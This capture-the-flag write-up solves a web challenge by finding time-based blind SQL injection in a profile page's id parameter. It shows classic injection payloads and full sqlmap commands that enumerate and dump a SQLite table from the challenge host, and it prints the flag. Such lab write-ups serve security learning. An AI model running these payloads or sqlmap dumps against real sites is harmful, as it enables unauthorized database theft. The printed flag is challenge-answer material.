<img width="585" height="329" alt="Screenshot 2025-08-28 000356" src="https://github.com/user-attachments/assets/09bf13f0-6568-49c9-b4ea-6b851fda64b4" />

# Challenge

The portal lets you query a user profile by User ID `(/?id=)`. That’s a classic injection point.

<img width="692" height="558" alt="Screenshot 2025-08-28 000339" src="https://github.com/user-attachments/assets/66071333-4485-4d8c-a946-24722db24720" />

At first, I thought the challenge might just be about bruteforcing User IDs until the flag showed up. While testing, I reached ID 101 and found a profile called **admin_legacy** with the note *“Access is restricted.”*

<img width="827" height="667" alt="Screenshot 2025-08-28 000350" src="https://github.com/user-attachments/assets/8f6df78e-b595-4d2d-8194-67bb1a328a5e" />

That made me overthink for a while, maybe it needed some kind of header exploit to bypass the restriction. But after a bit of testing, it became clear the real issue wasn’t about headers or bruteforce at all. The real vulnerability was hiding in the SQL injection on the User ID parameter.

That’s when I circled back and realized the real vulnerability wasn’t about brute-forcing IDs or headers it was hiding in the **SQL query behind the User ID parameter**.

So my first instinct was to try the usual suspects:

`' OR 1=1--` - did it show all users?

`1' ORDER BY 5--` - maybe cause an error?

`' UNION SELECT null,...--` - maybe dump some data directly?

But every attempt came back flat. No error messages, no obvious changes in the page, and definitely no dumped rows. The app just kept calmly returning the same profile as if nothing had happened.

At that point, I started piecing it together: if the input is injectable but doesn’t give me data back, and also refuses to leak errors, then it’s not **error-based** or **UNION-based**. What I was dealing with was almost certainly **blind SQL injection**.

## Solution 

Before diving deeper manually, I kicked off a **sqlmap** scan with broader settings and left it running while I checked other challenges:

```
sqlmap -u "https://nodeleaf.ctf.n3xtl3v3l.site/?id=101" \
  --batch --level=3 --risk=2
```

When I came back, sqlmap had confirmed my suspicion. The parameter `id` was indeed vulnerable:

<img width="983" height="401" alt="image" src="https://github.com/user-attachments/assets/7d40c8d6-6aa4-4417-a62f-811c73192081" />

No visible output, but controllable query delays meant **time-based blind SQLi** on **SQLite**.

Normally the next step would be to enumerate all databases and tables:

```
sqlmap -u "https://nodeleaf.ctf.n3xtl3v3l.site/?id=101" --batch --dbs
sqlmap -u "https://nodeleaf.ctf.n3xtl3v3l.site/?id=101" --batch -D SQLite_masterdb --tables
```

From that list, one table stood out immediately:

<img width="369" height="159" alt="image" src="https://github.com/user-attachments/assets/c80cc498-6fb6-448f-9498-2b6911512fff" />

Then, Enumerate columns of `secret_flag`

```
sqlmap -u "https://nodeleaf.ctf.n3xtl3v3l.site/?id=101" \
  --batch --dbms=SQLite --technique=T --time-sec=2 --threads=10 \
  -D SQLite_masterdb -T secret_flag --dump
```

- `--dbms=SQLite` → lock sqlmap onto the right backend.
- `--technique=T` → force time-based blind injection.
- `--time-sec=2` → 2-second delay probes (keeps it reliable but not painfully slow).
- `--threads=10` → speed up enumeration (parallel requests).

Once I confirmed the database contained a suspicious table named secret_flag, I went straight for it. Instead of bothering with the `users` or `sqlite_sequence tables`, I told sqlmap to dump everything from `secret_flag`:

## Flag

<img width="396" height="149" alt="image" src="https://github.com/user-attachments/assets/8be695c7-7915-4b14-860c-9de65c45299a" />

```
n3xt{t1m3_b4s3d_bl1nd_sqli_is_fun}
```

After solving it with blind SQL injection, I later discovered there was actually a much easier way. By enumerating the subdomain files, the entire SQLite database could be downloaded directly from:

```
https://nodeleaf.ctf.n3xtl3v3l.site/users.db
```

Opening this file locally with **sqlite3** `users.db` would instantly reveal the **secret_flag** table and the flag, skipping the time-based extraction entirely.
